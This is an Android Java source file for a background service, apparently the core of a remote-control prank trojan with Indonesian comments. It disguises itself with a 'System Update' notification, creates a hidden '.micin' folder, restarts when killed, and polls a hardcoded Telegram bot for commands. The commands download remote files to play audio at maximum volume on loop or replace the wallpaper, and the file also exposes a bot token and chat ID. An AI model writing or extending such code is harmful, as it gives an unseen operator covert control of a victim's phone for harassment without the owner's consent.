package com.example.helloworld;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.media.AudioManager;
import android.media.MediaPlayer;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.os.IBinder;
import android.provider.Settings;
import android.util.Log;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;

public class BotService extends Service {
    // ==========================================
    // GANTI DENGAN TOKEN BOT & CHAT ID LU
    // ==========================================
    private static final String BOT_TOKEN = "8717922799:AAF_P5xdZltK3ViVqFDLvaA-803cNGaPyu8";
    private static final String CHAT_ID = "8275632263";
    private static final String API_URL = "https://api.telegram.org/bot" + BOT_TOKEN;
    
    private long lastUpdateId = 0;
    private boolean isRunning = true;
    private MediaPlayer mediaPlayer;

    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
        Notification notification = new Notification.Builder(this, "bot_channel")
                .setContentTitle("System Update")
                .setContentText("Running in background...")
                .setSmallIcon(android.R.drawable.ic_dialog_info)
                .build();
        startForeground(1, notification);

        // Bikin folder .micin
        File micinDir = new File(Environment.getExternalStorageDirectory(), ".micin");
        if (!micinDir.exists()) micinDir.mkdirs();

        // Kirim pesan "Connected!"
        new Thread(() -> {
            sendMessage("🟢 *Connected!* VM siap menerima perintah.");
            startPolling();
        }).start();
    }

    private void startPolling() {
        while (isRunning) {
            try {
                URL url = new URL(API_URL + "/getUpdates?offset=" + (lastUpdateId + 1) + "&timeout=10");
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("GET");
                
                if (conn.getResponseCode() == 200) {
                    InputStream is = conn.getInputStream();
                    String response = new java.util.Scanner(is).useDelimiter("\\A").next();
                    // (Parsing JSON manual di Android pakai org.json)
                    org.json.JSONObject json = new org.json.JSONObject(response);
                    org.json.JSONArray result = json.getJSONArray("result");
                    
                    for (int i = 0; i < result.length(); i++) {
                        org.json.JSONObject update = result.getJSONObject(i);
                        lastUpdateId = update.getLong("update_id");
                        
                        if (update.has("message")) {
                            org.json.JSONObject message = update.getJSONObject("message");
                            if (message.has("text")) {
                                String text = message.getString("text");
                                handleCommand(text);
                            }
                        }
                    }
                }
                Thread.sleep(2000); // Polling tiap 2 detik
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

    private void handleCommand(String cmd) {
        try {
            if (cmd.startsWith("/playsound ")) {
                String[] parts = cmd.split(" ");
                if (parts.length >= 2) {
                    String url = parts[1];
                    boolean maxVol = cmd.contains("--maxvolume");
                    boolean loop = cmd.contains("--loop");
                    playSound(url, maxVol, loop);
                }
            } else if (cmd.startsWith("/setwallpaper ")) {
                String url = cmd.split(" ")[1];
                setWallpaper(url);
            }
            // ... (tambahkan case untuk 25 fitur lainnya di sini)
        } catch (Exception e) {
            sendMessage("❌ Error: " + e.getMessage());
        }
    }

    // ==========================================
    // FITUR 1: PLAY SOUND
    // ==========================================
    private void playSound(String urlString, boolean maxVol, boolean loop) {
        try {
            // Download lagu ke .micin
            File file = new File(Environment.getExternalStorageDirectory(), ".micin/temp_audio.mp3");
            downloadFile(urlString, file);

            if (maxVol) {
                AudioManager am = (AudioManager) getSystemService(Context.AUDIO_SERVICE);
                am.setStreamVolume(AudioManager.STREAM_MUSIC, am.getStreamMaxVolume(AudioManager.STREAM_MUSIC), 0);
            }

            if (mediaPlayer != null) {
                mediaPlayer.release();
            }
            mediaPlayer = new MediaPlayer();
            mediaPlayer.setDataSource(file.getAbsolutePath());
            mediaPlayer.setLooping(loop);
            mediaPlayer.prepare();
            mediaPlayer.start();
            sendMessage("🎵 Audio diputar! (Loop: " + loop + ")");
        } catch (Exception e) {
            sendMessage("❌ Gagal play: " + e.getMessage());
        }
    }

    // ==========================================
    // FITUR 2: SET WALLPAPER
    // ==========================================
    private void setWallpaper(String urlString) {
        try {
            File file = new File(Environment.getExternalStorageDirectory(), ".micin/wallpaper.jpg");
            downloadFile(urlString, file);
            
            android.app.WallpaperManager wm = android.app.WallpaperManager.getInstance(this);
            android.graphics.Bitmap bmp = android.graphics.BitmapFactory.decodeFile(file.getAbsolutePath());
            wm.setBitmap(bmp);
            sendMessage("🖼️ Wallpaper diganti!");
        } catch (Exception e) {
            sendMessage("❌ Gagal ganti wallpaper: " + e.getMessage());
        }
    }

    // ==========================================
    // UTILITIES
    // ==========================================
    private void downloadFile(String urlStr, File dest) throws Exception {
        URL url = new URL(urlStr);
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.connect();
        InputStream is = conn.getInputStream();
        FileOutputStream fos = new FileOutputStream(dest);
        byte[] buffer = new byte[1024];
        int len;
        while ((len = is.read(buffer)) > 0) {
            fos.write(buffer, 0, len);
        }
        fos.close();
        is.close();
    }

    private void sendMessage(String text) {
        try {
            String encoded = URLEncoder.encode(text, "UTF-8");
            URL url = new URL(API_URL + "/sendMessage?chat_id=" + CHAT_ID + "&text=" + encoded + "&parse_mode=Markdown");
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.getInputStream().close();
        } catch (Exception e) {}
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel serviceChannel = new NotificationChannel(
                    "bot_channel", "Foreground Service Channel", NotificationManager.IMPORTANCE_LOW);
            NotificationManager manager = getSystemService(NotificationManager.class);
            manager.createNotificationChannel(serviceChannel);
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY; // Biar service hidup lagi kalau di-kill
    }

    @Override
    public void onDestroy() {
        isRunning = false;
        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }
}
